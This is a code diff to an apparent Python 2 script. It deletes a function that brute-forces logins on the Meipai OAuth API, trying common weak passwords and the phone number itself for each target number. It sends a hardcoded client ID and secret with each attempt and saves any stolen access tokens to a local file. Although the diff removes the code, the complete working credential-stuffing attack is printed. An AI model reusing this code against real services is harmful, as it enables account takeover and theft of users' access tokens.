@@ -10,30 +10,7 @@ import requests
 import threadpool as tp
 
 
-def _burp(phone):
-    for pwd in ['123456', '123456789', '000000', phone]:
-        api_url = 'http://newapi.meipai.com/oauth/access_token.json'
-        data = {'phone': phone,
-                'client_id': '1089857302',
-                'client_secret': '38e8c5aet76d5c012e32',
-                'grant_type': 'phone',
-                'password': pwd,}
-        try:
-            print '[*] Burp Phone: %s' % phone
-            req = requests.post(api_url, data=data, timeout=5)
-        except:
-            continue
-        try:
-            success = json.loads(req.content)['access_token']
-            burp_success = open('./meipai_account.txt', 'a+')
-            burp_success.write('%s:::%s:::%s\n'%(phone, pwd,success))
-            burp_success.close()
-            print success
-            return success
-        except:
-            success = 0
-            print '[-] Burp False'
-            continue
+
 
 
 def _status(args):
